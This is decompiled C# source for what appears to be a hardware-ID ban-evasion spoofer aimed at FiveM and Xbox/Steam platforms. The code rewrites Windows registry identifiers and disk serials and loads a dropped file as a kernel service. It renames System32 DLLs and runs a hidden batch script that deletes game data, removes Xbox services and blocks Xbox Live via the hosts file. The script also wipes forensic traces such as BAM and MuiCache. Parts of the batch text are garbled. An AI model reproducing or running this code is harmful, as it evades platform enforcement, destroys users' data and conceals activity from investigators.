			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("InstallDate", value);
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00007EE4 File Offset: 0x000060E4
		public static void IDclick()
		{
			string value = string.Concat(new string[]
			{
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5),
				"-",
				Main.GenerateString(5)
			});
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", true);
			registryKey.SetValue("ProductID", value);
			registryKey.Close();
		}

		// Token: 0x06000087 RID: 135 RVA: 0x00007F6C File Offset: 0x0000616C
		public static void PCclick()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
			registryKey.SetValue("ComputerName", "DESKTOP-" + Main.GenerateString(6));
			registryKey.Close();
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00007FB8 File Offset: 0x000061B8
		public static void Diskclick()
		{
			foreach (string text in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
			{
				foreach (string text2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + text).GetSubKeyNames())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string.Concat(new string[]
					{
						"HARDWARE\\DEVICEMAP\\Scsi\\",
						text,
						"\\",
						text2,
						"\\Target Id 0\\Logical Unit Id 0"
					}), true);
					bool flag = registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral";
					if (flag)
					{
						string text3 = Main.RandomId(14);
						string text4 = Main.RandomId(14);
						registryKey.SetValue("DeviceIdentifierPage", Encoding.UTF8.GetBytes(text4));
						registryKey.SetValue("Identifier", text3);
						registryKey.SetValue("InquiryData", Encoding.UTF8.GetBytes(text3));
						registryKey.SetValue("SerialNumber", text4);
					}
				}
			}
		}

		// Token: 0x06000089 RID: 137 RVA: 0x000080F8 File Offset: 0x000062F8
		public static void FiveM()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			bool flag = Directory.Exists(folderPath + "\\DigitalEntitlements");
			if (flag)
			{
				Directory.Delete(folderPath + "\\DigitalEntitlements", true);
			}
			bool flag2 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\crashes");
			if (flag2)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\crashes", true);
			}
			bool flag3 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\logs");
			if (flag3)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\logs", true);
			}
			bool flag4 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\cache");
			if (flag4)
			{
				Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\data\\cache", true);
			}
			Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\server-cache");
			bool flag5 = Directory.Exists(folderPath2 + "\\CitizenFX");
			if (flag5)
			{
				Directory.Delete(folderPath2 + "\\CitizenFX", true);
			}
		}

		// Token: 0x0600008A RID: 138 RVA: 0x000081F8 File Offset: 0x000063F8
		private static void New()
		{
			Main.ExecuteCommand("sc create Win32x64_0 binPath= C:\\Windows\\zxEsdMeYxazy.dat type= kernel");
			Thread.Sleep(600);
			Main.ExecuteCommand("sc start Win32x64_0");
			Main.ExecuteCommand("sc stop Win32x64_0");
			Main.ExecuteCommand("sc delete Win32x64_0");
			File.Delete("C:\\Windows\\zxEsdMeYxazy.dat");
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00008248 File Offset: 0x00006448
		private static void ExecuteCommand(string command)
		{
			Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command)
			{
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardError = true,
				RedirectStandardOutput = true
			});
			process.WaitForExit();
			process.StandardOutput.ReadToEnd();
			process.StandardError.ReadToEnd();
			int exitCode = process.ExitCode;
			process.Close();
		}

		// Token: 0x0600008C RID: 140 RVA: 0x000082C0 File Offset: 0x000064C0
		private void siticoneRoundedButton11_Click_2(object sender, EventArgs e)
		{
			try
			{
				bool flag = File.Exists("C:\\Program Files\\Win64\\net.bat");
				if (flag)
				{
					File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
					File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
				}
				bool flag2 = Directory.Exists("C:\\Program Files (x86)\\Blade Group");
				if (flag2)
				{
					Directory.Delete("C:\\Program Files (x86)\\Blade Group");
					Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
				}
				Class1 @class = new Class1();
				@class.spoofUserMode();
			}
			catch
			{
			}
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("echo off");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % LocalAppData%\\DigitalEntitlements");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\botan.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam_api64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc STARCHARMS_SPOOFER");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\mods\\*.* ");
				streamWriter.WriteLine(":folderclean");
				streamWriter.WriteLine("call :getDiscordVersion");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("goto :xboxclean");
				streamWriter.WriteLine(": getDiscordVersion");
				streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
				streamWriter.WriteLine("     set 'varLoc =%%a'");
				streamWriter.WriteLine("   goto :d1");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine(":d1");
				streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
				streamWriter.WriteLine("     set 'discordVersion =%%z'");
				streamWriter.WriteLine(")");
				streamWriter.WriteLine("goto :EOF");
				streamWriter.WriteLine(": xboxclean");
				streamWriter.WriteLine(" cls");
				streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
				streamWriter.WriteLine("sc stop XblAuthManager");
				streamWriter.WriteLine("sc stop XblGameSave");
				streamWriter.WriteLine("sc stop XboxNetApiSvc");
				streamWriter.WriteLine("sc stop XboxGipSvc");
				streamWriter.WriteLine("sc delete XblAuthManager");
				streamWriter.WriteLine("sc delete XblGameSave");
				streamWriter.WriteLine("sc delete XboxNetApiSvc");
				streamWriter.WriteLine("sc delete XboxGipSvc");
				streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
				streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
				streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
				streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
				streamWriter.WriteLine("cls");
				streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
				streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
				streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
				streamWriter.WriteLine("   rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s");
				streamWriter.WriteLine("exit");
				streamWriter.WriteLine("goto :eof");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "Append Completion", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", "AutoSuggest", "yes", RegistryValueKind.String);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", "EnableAutoTray", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Copy To", "", "{C2FBB630-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CLASSES_ROOT\\AllFilesystemObjects\\shellex\\ContextMenuHandlers\\Move To", "", "{C2FBB631-2971-11D1-A18C-00C04FD75D13}");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "AutoEndTasks", "1");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "HungAppTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "WaitToKillAppTimeout", "2000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "LowLevelHooksTimeout", "1000");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "0");
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoLowDiskSpaceChecks", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "LinkResolveIgnoreLinkInfo", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", "00000001", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "2000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "4", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 1, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", 6, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", 0, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", 8, RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", "Medium", RegistryValueKind.String);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", "High", RegistryValueKind.String);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", "0", RegistryValueKind.DWord);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
			Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
			Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", "400");
			Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", "400");
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", "5000");
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", "2", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", 14, RegistryValueKind.DWord);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
			Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", "1", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", "0", RegistryValueKind.DWord);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", 0);
